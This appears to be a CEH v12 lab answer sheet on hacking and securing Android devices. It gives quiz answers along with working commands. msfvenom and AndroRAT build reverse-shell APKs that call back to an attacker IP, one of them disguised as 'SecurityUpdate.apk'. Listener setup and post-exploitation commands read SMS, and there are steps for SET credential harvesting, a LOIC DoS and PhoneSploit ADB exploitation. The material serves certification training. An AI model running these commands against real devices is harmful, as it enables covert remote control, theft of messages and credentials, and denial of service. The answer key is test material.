# Tasks

## Hack Android Devices

### Hack an Android Device by Creating Binary Payloads

Use Metasploit to create a binary payload in Parrot Security to hack an Android device. Enter the computer name of the target android system.

localhost



#### Create Binary Payload

```
msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk
```

#### Create a Listener

```
msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST 10.10.1.13

show options

exploit -j -z
```



{% hint style="info" %}
Install & Execute the Malicious apk in the Android Device
{% endhint %}

#### Interact with the Android Device

```
sessions -i 1

sysinfo
```



### Harvest User's Credentials using the Social-Engineer Toolkit

Sniff user credentials on the Android platform by using the credential harvester attack method of the Social-Engineer Toolkit (SET). Use the URL http://certifiedhacker.com/Online%20Booking/index.htm for cloning. Enter the port number on which the SET credential harvester attack works

80



### Launch a DoS Attack on a Target machine using LOIC on the Android Mobile

Use LOIC on the Android mobile platform to launch a DoS attack on a target machine (Windows Server 2019). Use the Wireshark tool to capture the traffic at the target machine. Enter the Destination port number of the packet sent from the Android machine to the target machine. Note: LOIC is available at CEH-Tools/CEHv12 Module 17 Hacking Mobile Platforms/Android Hacking Tools/Low Orbit Ion Cannon (LOIC).

80



### Exploit the Android Platform through ADB using PhoneSploit

Use the PhoneSploit tool to exploit the Android mobile platform through ADB. Enter the name of the jpeg file in the “Download” folder.

images.jpeg

```
python3 phonesploit.py

3

10.10.1.14

4

pwd
```



### Hack an Android Device by Creating APK File using AndroRAT

Use AndroRAT to create an APK file to hack an Android device. Enter the option that is used to specify the local IP address while creating an APK file using androRAT.

\-i

```
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
```



Use AndroRAT to create an APK file to hack an Android device. What is the command used to obtain a file containing SMSes from the inbox of a victim device using androRAT.

getSMS

#### Start a Listener&#x20;

```
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
```

{% hint style="info" %}
Install and Execute the SecurityUpdate.apk in the android device
{% endhint %}

#### Interact with the Android Device

```
help

deviceInfo

getSMS inbox

getMACAddress

exit
```



## Secure Android Devices

### Analyze a Malicious App using Online Android Analyzers

Use Metasploit to create a binary payload in Parrot Security to hack an Android device. Use the Sixo Online APK Analyzer tool (https://www.sisik.eu/apk-tool) to analyze the binary payload. What is the package name for the payload?

com.metasploit.stage

{% embed url="https://www.sisik.eu/apk-tool" %}

### Secure Android Devices from Malicious Apps using Malwarebytes Security

Use Metasploit to create a binary payload in Parrot Security and hack an Android device. Then, scan the Android device for malicious applications using the Malwarebytes Security mobile application. On which screen does Malwarebytes Security dispays the deleted malicious files?

Scanning history
